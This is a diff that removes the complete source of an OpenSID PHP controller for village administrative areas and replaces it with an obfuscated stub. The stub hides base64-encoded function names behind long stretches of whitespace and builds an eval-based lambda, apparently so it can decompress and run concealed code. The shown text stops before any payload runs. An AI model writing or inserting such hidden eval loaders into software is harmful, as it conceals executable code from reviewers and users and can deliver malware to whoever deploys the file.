@@ -1,670 +1,473 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-use App\Models\Penduduk;
-use App\Models\Wilayah as WilayahModel;
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Wilayah extends Admin_Controller
-{
-    private array $_set_page = ['20', '50', '100'];
-
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->model(['wilayah_model', 'pamong_model']);
-        $this->load->library('form_validation');
-        $this->modul_ini     = 'info-desa';
-        $this->sub_modul_ini = 'wilayah-administratif';
-    }
-
-    public function clear(): void
-    {
-        $this->session->unset_userdata('cari');
-        $this->session->per_page = $this->_set_page[0];
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}");
-    }
-
-    public function index($p = 1, $o = 0): void
-    {
-        $per_page = $this->input->post('per_page');
-        if (isset($per_page)) {
-            $this->session->per_page = $per_page;
-        }
-
-        $data = $this->cache->pakai_cache(function () use ($p, $o) {
-            $data['p']        = $p;
-            $data['o']        = $o;
-            $data['cari']     = $this->session->cari ?: '';
-            $data['func']     = 'index';
-            $data['set_page'] = $this->_set_page;
-            $data['per_page'] = $this->session->per_page;
-            $data['keyword']  = $this->wilayah_model->autocomplete();
-            $data['paging']   = json_decode(json_encode($this->wilayah_model->paging($p, $o), JSON_THROW_ON_ERROR), null);
-            $data['main']     = $this->wilayah_model->list_data($o, $data['paging']->offset, $data['paging']->per_page);
-            $data['total']    = $this->wilayah_model->total();
-
-            return $data;
-        }, "{$this->session->per_page}_{$p}_{$this->session->cari}_dusun_wilayah", 24 * 60 * 60);
-
-        $data['cek_lokasi_peta'] = cek_lokasi_peta($this->header['desa']);
-
-        $this->render('sid/wilayah/wilayah', $data);
-    }
-
-    // $aksi = cetak/unduh
-    public function dialog($aksi = 'cetak'): void
-    {
-        $data                = $this->modal_penandatangan();
-        $data['aksi']        = $aksi;
-        $data['form_action'] = site_url("{$this->controller}/daftar/{$aksi}");
-        $this->load->view('global/ttd_pamong', $data);
-    }
-
-    // $aksi = cetak/unduh
-    public function daftar($aksi = 'cetak'): void
-    {
-        $data['pamong_ttd']     = $this->pamong_model->get_data($this->input->post('pamong_ttd'));
-        $data['pamong_ketahui'] = $this->pamong_model->get_data($this->input->post('pamong_ketahui'));
-        $data['desa']           = $this->header['desa'];
-        $data['main']           = $this->wilayah_model->list_semua_wilayah();
-        $data['total']          = $this->wilayah_model->total();
-
-        $this->load->view("sid/wilayah/wilayah_{$aksi}", $data);
-    }
-
-    public function form($id_dusun = ''): void
-    {
-        $this->redirect_hak_akses('u');
-
-        if ($id_dusun) {
-            $data['dusun']       = WilayahModel::with('kepala')->find($id_dusun) ?? show_404();
-            $data['form_action'] = site_url("{$this->controller}/update/{$id_dusun}");
-        } else {
-            $data['dusun']       = null;
-            $data['form_action'] = site_url("{$this->controller}/insert");
-        }
-
-        $this->render('sid/wilayah/wilayah_form', $data);
-    }
-
-    public function apipendudukwilayah()
-    {
-        if ($this->input->is_ajax_request()) {
-            $cari     = $this->input->get('q');
-            $kepala   = WilayahModel::pluck('id_kepala')->filter(static fn ($value): bool => null !== $value);
-            $penduduk = Penduduk::select(['id', 'nik', 'nama', 'id_cluster'])
-                ->when($cari, static function ($query) use ($cari): void {
-                    $query->orWhere('nik', 'like', "%{$cari}%")
-                        ->orWhere('nama', 'like', "%{$cari}%");
-                })
-                ->whereNotIn('id', $kepala)
-                ->paginate(10);
-
-            return json([
-                'results' => collect($penduduk->items())
-                    ->map(static fn ($item): array => [
-                        'id'   => $item->id,
-                        'text' => 'NIK : ' . $item->nik . ' - ' . $item->nama . ' RT-' . $item->wilayah->rt . ', RW-' . $item->wilayah->rw . ', ' . strtoupper(setting('sebutan_dusun') . ' ' . $item->wilayah->dusun),
-                    ]),
-                'pagination' => [
-                    'more' => $penduduk->currentPage() < $penduduk->lastPage(),
-                ],
-            ]);
-        }
-
-        return show_404();
-    }
-
-    public function search(): void
-    {
-        $cari = $this->input->post('cari');
-        if ($cari != '') {
-            $this->session->cari = $cari;
-        } else {
-            $this->session->unset_userdata('cari');
-        }
-        redirect("{$this->controller}");
-    }
-
-    public function insert(): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->insert();
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}");
-    }
-
-    public function update($id = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update($id);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}");
-    }
-
-    //Delete dusun/rw/rt tergantung tipe
-    public function delete($tipe = '', $id = ''): void
-    {
-        $this->redirect_hak_akses('h');
-        $this->wilayah_model->delete($tipe, $id);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect($_SERVER['HTTP_REFERER']);
-    }
-
-    public function sub_rw($id_dusun = '', $p = 1, $o = 0): void
-    {
-        $per_page = $this->input->post('per_page');
-        if (isset($per_page)) {
-            $this->session->per_page = $per_page;
-        }
-
-        $data = $this->cache->pakai_cache(function () use ($id_dusun, $p, $o) {
-            $dusun            = $this->wilayah_model->cluster_by_id($id_dusun);
-            $nama_dusun       = $dusun['dusun'];
-            $data['dusun']    = $dusun['dusun'];
-            $data['id_dusun'] = $id_dusun;
-            $data['func']     = "sub_rw/{$id_dusun}";
-            $data['set_page'] = $this->_set_page;
-            $data['paging']   = json_decode(json_encode($this->wilayah_model->paging_rw($p, $o, $nama_dusun), JSON_THROW_ON_ERROR), null);
-            $data['main']     = $this->wilayah_model->list_data_rw($id_dusun, $data['paging']->offset, $data['paging']->per_page);
-            $data['total']    = $this->wilayah_model->total_rw($nama_dusun);
-
-            return $data;
-        }, "{$this->session->per_page}_{$p}_{$id_dusun}_rw_wilayah", 24 * 60 * 60);
-
-        $data['cek_lokasi_peta'] = cek_lokasi_peta($this->wilayah_model->cluster_by_id($id_dusun));
-
-        $this->render('sid/wilayah/wilayah_rw', $data);
-    }
-
-    public function cetak_rw($id_dusun = ''): void
-    {
-        $dusun            = $this->wilayah_model->cluster_by_id($id_dusun);
-        $nama_dusun       = $dusun['dusun'];
-        $data['dusun']    = $dusun['dusun'];
-        $data['id_dusun'] = $id_dusun;
-        $data['main']     = $this->wilayah_model->list_data_rw($id_dusun);
-        $data['total']    = $this->wilayah_model->total_rw($nama_dusun);
-
-        $this->load->view('sid/wilayah/wilayah_rw_print', $data);
-    }
-
-    public function excel_rw($id_dusun = ''): void
-    {
-        $dusun            = $this->wilayah_model->cluster_by_id($id_dusun);
-        $nama_dusun       = $dusun['dusun'];
-        $data['dusun']    = $dusun['dusun'];
-        $data['id_dusun'] = $id_dusun;
-        $data['main']     = $this->wilayah_model->list_data_rw($id_dusun);
-        $data['total']    = $this->wilayah_model->total_rw($nama_dusun);
-
-        $this->load->view('sid/wilayah/wilayah_rw_excel', $data);
-    }
-
-    public function form_rw($id_dusun = '', $id_rw = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $data_dusun       = $this->wilayah_model->cluster_by_id($id_dusun);
-        $data['dusun']    = $data_dusun['dusun'];
-        $data['id_dusun'] = $id_dusun;
-
-        if ($id_rw) {
-            $data_rw             = $this->wilayah_model->cluster_by_id($id_rw);
-            $data['id_rw']       = $id_rw;
-            $data['rw']          = $data_rw['rw'];
-            $data['individu']    = $this->wilayah_model->get_penduduk($data_rw['id_kepala']);
-            $data['form_action'] = site_url("{$this->controller}/update_rw/{$id_dusun}/{$id_rw}");
-        } else {
-            $data['id_rw']       = null;
-            $data['rw']          = null;
-            $data['form_action'] = site_url("{$this->controller}/insert_rw/{$id_dusun}");
-        }
-
-        $this->render('sid/wilayah/wilayah_form_rw', $data);
-    }
-
-    public function insert_rw($id_dusun = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->insert_rw($id_dusun);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}/sub_rw/{$id_dusun}");
-    }
-
-    public function update_rw($id_dusun = '', $id_rw = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_rw($id_rw);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}/sub_rw/{$id_dusun}");
-    }
-
-    public function sub_rt($id_dusun = '', $id_rw = '', $p = 1, $o = 0): void
-    {
-        $per_page = $this->input->post('per_page');
-        if (isset($per_page)) {
-            $this->session->per_page = $per_page;
-        }
-
-        $data = $this->cache->pakai_cache(function () use ($id_dusun, $id_rw, $p, $o) {
-            $data_rw          = $this->wilayah_model->cluster_by_id($id_rw);
-            $data['dusun']    = $data_rw['dusun'];
-            $data['id_dusun'] = $id_dusun;
-            $data['rw']       = $data_rw['rw'];
-            $data['id_rw']    = $id_rw;
-            $data['func']     = "sub_rt/{$id_dusun}/{$id_rw}";
-            $data['set_page'] = $this->_set_page;
-            $data['paging']   = $this->wilayah_model->paging_rt($p, $o, $data['dusun'], $data['rw']);
-            $data['main']     = $this->wilayah_model->list_data_rt($data['dusun'], $data['rw'], $data['paging']->offset, $data['paging']->per_page);
-            $data['total']    = $this->wilayah_model->total_rt($data['dusun'], $data['rw']);
-
-            return $data;
-        }, "{$this->session->per_page}_{$p}_{$id_dusun}_{$id_rw}_rt_wilayah", 24 * 60 * 60);
-
-        $dataWilayahRW = $this->wilayah_model->cluster_by_id($id_rw);
-        if ($dataWilayahRW['rw'] == '-') {
-            // ambil dari data dusun
-            $dataWilayahRW = $this->wilayah_model->cluster_by_id($id_dusun);
-        }
-        $data['cek_lokasi_peta'] = cek_lokasi_peta($dataWilayahRW);
-
-        $this->render('sid/wilayah/wilayah_rt', $data);
-    }
-
-    public function cetak_rt($id_dusun = '', $id_rw = ''): void
-    {
-        $temp             = $this->wilayah_model->cluster_by_id($id_dusun);
-        $dusun            = $temp['dusun'];
-        $data['dusun']    = $temp['dusun'];
-        $data['id_dusun'] = $id_dusun;
-
-        $temp          = $this->wilayah_model->cluster_by_id($id_rw);
-        $rw            = $temp['rw'];
-        $data['rw']    = $rw;
-        $data['main']  = $this->wilayah_model->list_data_rt($dusun, $rw);
-        $data['total'] = $this->wilayah_model->total_rt($dusun, $rw);
-
-        $this->load->view('sid/wilayah/wilayah_rt_print', $data);
-    }
-
-    public function excel_rt($id_dusun = '', $id_rw = ''): void
-    {
-        $temp             = $this->wilayah_model->cluster_by_id($id_dusun);
-        $dusun            = $temp['dusun'];
-        $data['dusun']    = $temp['dusun'];
-        $data['id_dusun'] = $id_dusun;
-
-        $temp          = $this->wilayah_model->cluster_by_id($id_rw);
-        $rw            = $temp['rw'];
-        $data['rw']    = $rw;
-        $data['main']  = $this->wilayah_model->list_data_rt($dusun, $rw);
-        $data['total'] = $this->wilayah_model->total_rt($dusun, $rw);
-
-        $this->load->view('sid/wilayah/wilayah_rt_excel', $data);
-    }
-
-    public function form_rt($id_dusun = '', $id_rw = '', $id_rt = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $data_rw          = $this->wilayah_model->cluster_by_id($id_rw);
-        $data['dusun']    = $data_rw['dusun'];
-        $data['id_dusun'] = $id_dusun;
-        $data['rw']       = $data_rw['rw'];
-        $data['id_rw']    = $id_rw;
-
-        if ($id_rt) {
-            $data_rt             = $this->wilayah_model->cluster_by_id($id_rt);
-            $data['rt']          = $data_rt['rt'];
-            $data['individu']    = $this->wilayah_model->get_penduduk($data_rt['id_kepala']);
-            $data['form_action'] = site_url("{$this->controller}/update_rt/{$id_dusun}/{$id_rw}/{$id_rt}");
-        } else {
-            $data['rt']          = null;
-            $data['form_action'] = site_url("{$this->controller}/insert_rt/{$id_dusun}/{$id_rw}");
-        }
-
-        $this->render('sid/wilayah/wilayah_form_rt', $data);
-    }
-
-    public function insert_rt($id_dusun = '', $id_rw = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->insert_rt($id_dusun, $id_rw);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}/sub_rt/{$id_dusun}/{$id_rw}");
-    }
-
-    public function update_rt($id_dusun = '', $id_rw = '', $id_rt = 0): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_rt($id_rt);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}/sub_rt/{$id_dusun}/{$id_rw}");
-    }
-
-    public function warga($id = ''): void
-    {
-        $temp  = $this->wilayah_model->cluster_by_id($id);
-        $dusun = $temp['dusun'];
-
-        $_SESSION['per_page'] = 100;
-        $_SESSION['dusun']    = $dusun;
-        redirect('penduduk/index/1/0');
-    }
-
-    public function warga_kk($id = ''): void
-    {
-        $temp                 = $this->wilayah_model->cluster_by_id($id);
-        $dusun                = $temp['dusun'];
-        $_SESSION['per_page'] = 50;
-        $_SESSION['dusun']    = $dusun;
-        redirect('keluarga/index/1/0');
-    }
-
-    public function warga_l($id = ''): void
-    {
-        $temp  = $this->wilayah_model->cluster_by_id($id);
-        $dusun = $temp['dusun'];
-
-        $_SESSION['per_page'] = 100;
-        $_SESSION['dusun']    = $dusun;
-        $_SESSION['sex']      = 1;
-        redirect('penduduk/index/1/0');
-    }
-
-    public function warga_p($id = ''): void
-    {
-        $temp  = $this->wilayah_model->cluster_by_id($id);
-        $dusun = $temp['dusun'];
-
-        $_SESSION['per_page'] = 100;
-        $_SESSION['dusun']    = $dusun;
-        $_SESSION['sex']      = 2;
-        redirect('penduduk/index/1/0');
-    }
-
-    public function ajax_kantor_dusun_maps($id = ''): void
-    {
-        $data['wil_atas'] = $this->header['desa'];
-        $sebutan_desa     = ucwords($this->setting->sebutan_desa);
-        $namadesa         = $data['wil_atas']['nama_desa'];
-
-        $this->ubah_lokasi_peta($data['wil_atas'], 'index', "Lokasi Kantor {$sebutan_desa} {$namadesa} Belum Dilengkapi");
-
-        $data['poly']    = 'multi';
-        $data['wil_ini'] = $this->wilayah_model->cluster_by_id($id);
-
-        $data['dusun_gis']    = $this->wilayah_model->list_dusun();
-        $data['rw_gis']       = $this->wilayah_model->list_rw();
-        $data['rt_gis']       = $this->wilayah_model->list_rt();
-        $data['nama_wilayah'] = ucwords(setting('sebutan_dusun') . ' ' . $data['wil_ini']['dusun'] . ' ' . $sebutan_desa . ' ' . $data['wil_atas']['nama_desa']);
-        $data['wilayah']      = ucwords(setting('sebutan_dusun'));
-        $data['breadcrumb']   = [
-            ['link' => site_url('wilayah/clear'), 'judul' => 'Daftar ' . $data['wilayah']],
-        ];
-        $data['form_action'] = site_url("{$this->controller}/update_kantor_dusun_map/{$id}");
-        $data['logo']        = $this->header['desa'];
-
-        $this->render('sid/wilayah/maps_kantor', $data);
-    }
-
-    public function ajax_wilayah_dusun_maps($id = ''): void
-    {
-        $data['wil_atas'] = $this->header['desa'];
-        $sebutan_desa     = ucwords($this->setting->sebutan_desa);
-        $namadesa         = $data['wil_atas']['nama_desa'];
-        $this->ubah_lokasi_peta($data['wil_atas'], 'index', "Peta Wilayah {$sebutan_desa} {$namadesa} Belum Dilengkapi");
-
-        $data['poly']         = 'multi';
-        $data['wil_ini']      = $this->wilayah_model->cluster_by_id($id);
-        $data['dusun_gis']    = $this->wilayah_model->list_dusun();
-        $data['rw_gis']       = $this->wilayah_model->list_rw();
-        $data['rt_gis']       = $this->wilayah_model->list_rt();
-        $data['nama_wilayah'] = ucwords(setting('sebutan_dusun') . ' ' . $data['wil_ini']['dusun'] . ' ' . $sebutan_desa . ' ' . $data['wil_atas']['nama_desa']);
-        $data['wilayah']      = ucwords(setting('sebutan_dusun'));
-        $data['breadcrumb']   = [
-            ['link' => site_url('wilayah/clear'), 'judul' => 'Daftar ' . $data['wilayah']],
-        ];
-        $data['form_action'] = site_url("{$this->controller}/update_wilayah_dusun_map/{$id}");
-        $data['logo']        = $this->header['desa'];
-
-        $this->render('sid/wilayah/maps_wilayah', $data);
-    }
-
-    public function update_kantor_dusun_map($id = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_kantor_dusun_map($id);
-        redirect("{$this->controller}");
-    }
-
-    public function update_wilayah_dusun_map($id = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_wilayah_dusun_map($id);
-        redirect("{$this->controller}");
-    }
-
-    public function ajax_kantor_rw_maps($id_dusun = '', $id_rw = ''): void
-    {
-        $data['wil_atas'] = $this->wilayah_model->cluster_by_id($id_dusun);
-        $sebutan_dusun    = ucwords(setting('sebutan_dusun'));
-        $dusun            = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "sub_rw/{$id_dusun}", "Lokasi Kantor {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_atas']  = $this->wilayah_model->cluster_by_id($id_dusun);
-        $data['wil_ini']   = $this->wilayah_model->cluster_by_id($id_rw);
-        $data['dusun_gis'] = $this->wilayah_model->list_dusun();
-        $data['rw_gis']    = $this->wilayah_model->list_rw();
-        $data['rt_gis']    = $this->wilayah_model->list_rt();
-
-        $data['nama_wilayah'] = 'RW ' . $data['wil_ini']['rw'] . ' ' . $sebutan_dusun . ' ' . $dusun;
-        $data['breadcrumb']   = [
-            ['link' => site_url('wilayah/clear'), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => site_url("{$this->controller}/sub_rw/{$id_dusun}"), 'judul' => 'Daftar RW'],
-        ];
-        $data['wilayah']     = 'RW';
-        $data['form_action'] = site_url("{$this->controller}/update_kantor_rw_map/{$id_dusun}/{$id_rw}");
-        $data['logo']        = $this->header['desa'];
-
-        $this->render('sid/wilayah/maps_kantor', $data);
-    }
-
-    public function ajax_wilayah_rw_maps($id_dusun = '', $id_rw = ''): void
-    {
-        $data['wil_atas'] = $this->wilayah_model->cluster_by_id($id_dusun);
-        $sebutan_dusun    = ucwords(setting('sebutan_dusun'));
-        $dusun            = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "sub_rw/{$id_dusun}", "Peta Wilayah {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']      = $this->wilayah_model->cluster_by_id($id_rw);
-        $data['dusun_gis']    = $this->wilayah_model->list_dusun();
-        $data['rw_gis']       = $this->wilayah_model->list_rw();
-        $data['rt_gis']       = $this->wilayah_model->list_rt();
-        $dusun                = $data['wil_atas']['dusun'];
-        $data['nama_wilayah'] = 'RW ' . $data['wil_ini']['rw'] . ' ' . $sebutan_dusun . ' ' . $dusun;
-        $data['breadcrumb']   = [
-            ['link' => site_url('wilayah/clear'), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => site_url("{$this->controller}/sub_rw/{$id_dusun}"), 'judul' => 'Daftar RW'],
-        ];
-        $data['wilayah']     = 'RW';
-        $data['form_action'] = site_url("{$this->controller}/update_wilayah_rw_map/{$id_dusun}/{$id_rw}");
-        $data['logo']        = $this->header['desa'];
-
-        $this->render('sid/wilayah/maps_wilayah', $data);
-    }
-
-    public function update_kantor_rw_map($id_dusun = '', $id_rw = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_kantor_rw_map($id_rw);
-        redirect("{$this->controller}/sub_rw/{$id_dusun}");
-    }
-
-    public function update_wilayah_rw_map($id_dusun = '', $rw = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_wilayah_rw_map($id_rw);
-        redirect("{$this->controller}/sub_rw/{$id_dusun}");
-    }
-
-    public function ajax_kantor_rt_maps($id_dusun = '', $id_rw = '', $id = ''): void
-    {
-        $dataRW           = $this->wilayah_model->cluster_by_id($id_rw);
-        $data['wil_atas'] = $dataRW;
-        if ($dataRW['rw'] == '-') {
-            $data['wil_atas'] = $this->wilayah_model->cluster_by_id($id_dusun);
-        }
-        $sebutan_dusun = ucwords(setting('sebutan_dusun'));
-        $dusun         = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "sub_rt/{$id_dusun}/{$id_rw}", "Lokasi Kantor {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']      = $this->wilayah_model->cluster_by_id($id);
-        $data['dusun_gis']    = $this->wilayah_model->list_dusun();
-        $data['rw_gis']       = $this->wilayah_model->list_rw();
-        $data['rt_gis']       = $this->wilayah_model->list_rt();
-        $data['nama_wilayah'] = 'RT ' . $data['wil_ini']['rt'] . ' RW ' . $data['wil_ini']['rw'] . ' ' . ucwords($sebutan_dusun . ' ' . $data['wil_ini']['dusun']);
-        $data['breadcrumb']   = [
-            ['link' => site_url("{$this->controller}/clear"), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => site_url("{$this->controller}/sub_rw/{$id_dusun}"), 'judul' => 'Daftar RW'],
-            ['link' => site_url("{$this->controller}/sub_rt/{$id_dusun}/{$id_rw}"), 'judul' => 'Daftar RT'],
-        ];
-        $data['wilayah']     = 'RT';
-        $data['form_action'] = site_url("{$this->controller}/update_wilayah_rt_map/{$id_dusun}/{$id_rw}/{$id}");
-        $data['logo']        = $this->header['desa'];
-
-        $this->render('sid/wilayah/maps_kantor', $data);
-    }
-
-    public function ajax_wilayah_rt_maps($id_dusun = '', $id_rw = '', $id = ''): void
-    {
-        $dataRW           = $this->wilayah_model->cluster_by_id($id_rw);
-        $data['wil_atas'] = $dataRW;
-        if ($dataRW['rw'] == '-') {
-            $data['wil_atas'] = $this->wilayah_model->cluster_by_id($id_dusun);
-        }
-
-        $sebutan_dusun = ucwords(setting('sebutan_dusun'));
-        $dusun         = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "sub_rt/{$id_dusun}/{$id_rw}", "Peta Wilayah {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']      = $this->wilayah_model->cluster_by_id($id);
-        $data['dusun_gis']    = $this->wilayah_model->list_dusun();
-        $data['rw_gis']       = $this->wilayah_model->list_rw();
-        $data['rt_gis']       = $this->wilayah_model->list_rt();
-        $data['nama_wilayah'] = 'RT ' . $data['wil_ini']['rt'] . ' RW ' . $data['wil_ini']['rw'] . ' ' . ucwords($sebutan_dusun . ' ' . $data['wil_ini']['dusun']);
-        $data['breadcrumb']   = [
-            ['link' => site_url("{$this->controller}/clear"), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => site_url("{$this->controller}/sub_rw/{$id_dusun}"), 'judul' => 'Daftar RW'],
-            ['link' => site_url("{$this->controller}/sub_rt/{$id_dusun}/{$id_rw}"), 'judul' => 'Daftar RT'],
-        ];
-        $data['wilayah']     = 'RT';
-        $data['form_action'] = site_url("{$this->controller}/update_wilayah_rt_map/{$id_dusun}/{$id_rw}/{$id}");
-        $data['logo']        = $this->header['desa'];
-
-        $this->render('sid/wilayah/maps_wilayah', $data);
-    }
-
-    public function update_kantor_rt_map($id_dusun = '', $id_rw = '', $id = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_kantor_rt_map($id);
-        redirect("{$this->controller}/sub_rt/{$id_dusun}/{$id_rw}");
-    }
-
-    public function update_wilayah_rt_map($id_dusun = '', $id_rw = '', $id = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->update_wilayah_rt_map($id);
-        redirect("{$this->controller}/sub_rt/{$id_dusun}/{$id_rw}");
-    }
-
-    public function kosongkan($id = ''): void
-    {
-        $this->redirect_hak_akses('u');
-        $this->wilayah_model->kosongkan_path($id);
-
-        redirect($this->controller);
-    }
-
-    public function urut($tipe = '', $p = 1, $id = 0, $arah = 0, $id_dusun = 0, $id_rw = 0): void
-    {
-        switch ($tipe) {
-            case 'dusun': $url = "index/{$p}";
-                break;
-
-            case 'rw': $url = "sub_rw/{$id_dusun}/{$p}";
-                break;
-
-            case 'rt': $url = "sub_rt/{$id_dusun}/{$id_rw}/{$p}";
-                break;
-
-            default:
-                // code...
-                break;
-        }
-
-        $this->wilayah_model->urut($tipe, $id, $arah, $id_dusun, $id_rw);
-        $this->cache->hapus_cache_untuk_semua('_wilayah');
-        redirect("{$this->controller}/{$url}");
-    }
-
-    public function list_rw($dusun = ''): void
-    {
-        $list_rw = $this->wilayah_model->list_rw($dusun);
-        echo json_encode($list_rw, JSON_THROW_ON_ERROR);
-    }
-
-    public function list_rt($dusun = '', $rw = '-'): void
-    {
-        $list_rt = $this->wilayah_model->list_rt($dusun, $rw);
-        echo json_encode($list_rt, JSON_THROW_ON_ERROR);
-    }
-
-    public function ubah_lokasi_peta($wilayah, $to = 'index', $msg = ''): void
-    {
-        $this->redirect_hak_akses('u');
-
-        if (! cek_lokasi_peta($wilayah)) {
-            session_error($msg);
-
-            redirect("{$this->controller}/{$to}");
-        }
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Wilayah.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      